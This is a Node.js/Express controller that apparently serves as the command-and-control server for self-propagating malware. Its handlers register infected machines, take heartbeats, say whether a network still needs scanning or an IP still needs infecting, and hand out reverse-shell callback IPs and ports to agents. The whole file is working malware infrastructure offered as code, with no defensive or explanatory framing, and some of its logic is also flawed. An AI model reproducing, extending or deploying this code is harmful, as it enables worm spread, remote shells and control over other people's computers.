const config = require("../config/auth.config");
const db = require("../models");
const User = db.user;
const Role = db.role;
const GlobInf = db.globinf;
const Machine = db.machine;
var sanitize = require('mongo-sanitize')

var jwt = require("jsonwebtoken");
var bcrypt = require("bcryptjs");

const statusAgent = async (req, res) => {
    const action = sanitize(req.body.action);

    const global_infos = await GlobInf.find({}, (err, globinf) => {
        if (err) {
            res.status(500).send({err});
            return ;
        }
        return (globinf);
    });

  switch (action.status) {
    case "networkscan":
        const network = req.body.data.ip.split('.');
        network.splice(3);
        res.status(200).send({toscan: !global_infos.scanned_networks.includes(network + ".0/24")}); // Ajouter après check si n'existe pas
        break;
    case "infected":
        const ip = req.body.data.ip;
        res.status(200).send({toinfect: !global_infos.infected.includes(ip)}); // Ajouter après check si n'existe pas
        break;
    default:
        break;
  }
  return ;
};

const updateAgent = async (req, res) => {
    const hostname = sanitize(req.body.data.hostname);
    const db_value = sanitize(req.body.data.value);

    Machine.updateOne({hostname: hostname}, {[db_value]: true}, (err) => {
        if (err) {
            res.status(500).send({message: err});
            return ;
        }
    })
    return ;
};


const discoveredHosts = async (req, res) => {
    const hostDiscovered = sanitize(req.body.data.hostDiscoverd);

    GlobInf.updateOne({}, {discoveredHosts: hostDiscovered}, (err) => {
        if (err) {
            res.status(500).send({message: err});
            return ;
        }
    })
    return ;
};

const announce = async (req, res) => {
    const info = new Machine({...sanitize(req.body), initial_date: Date.now()});
    console.log(info, req.body);

    Machine.findOne({ip: info.ip}, (err, machine) => {
        if (err) {
            res.status(500).send({err});
            return ;
        }
        if (machine === null) {
            info.save(err => {
                if (err)
                    res.status(500).send({err});
            })
            res.status(200).send({message: "machine successfully added to db"})
            return ;
        }
    })
    // res.status(200).send({message: "machine not saved because ip already existing in db"});
    return ;
};

const alive = async (req, res) => {
    const machine = sanitize(req.body);

    Machine.updateOne({hostname: machine.hostname}, {alive: true}, (err) => {
        if (err) {
            res.status(500).send({message: err});
            return ;
        }
        res.status(200).send({message: "updated"});
    })
    return ;
};

const revshell = async (req, res) => { // update db to set needed to true or false
    const revshelll = sanitize(req.body);

    Machine.updateOne({computer_name: revshelll.computer_name}, {revshelll: {need: revshelll.need, port: revshelll.port, ip: revshelll.ip}}).exec((err) => {
        if (err) {
            res.status(500).send(err);
            return ;
        }
        res.status(200).send("ok");
        return ;
    })
}

const getRevshell = async (req, res) => { // Tell the agent if the revshell is needed or not
    const computer_name = sanitize(req.body.computer_name);

    Machine.findOne({computer_name}).exec(
        (err, machine) => {
            if (err) {
                res.status(500).send(err);
                return ;
            }
            console.log(machine.revshell);
            if (machine && machine.revshell && machine.revshell.need) {
                res.status(200).send({port: machine.revshell.port, ip: machine.revshell.ip});
                return ;
            }
            res.status(200).send("This machine didn't request a revshell");
        }
    )
    return ;
}

module.exports = {
    statusAgent,
    announce,
    alive,
    revshell,
    getRevshell,
    updateAgent,
    discoveredHosts
}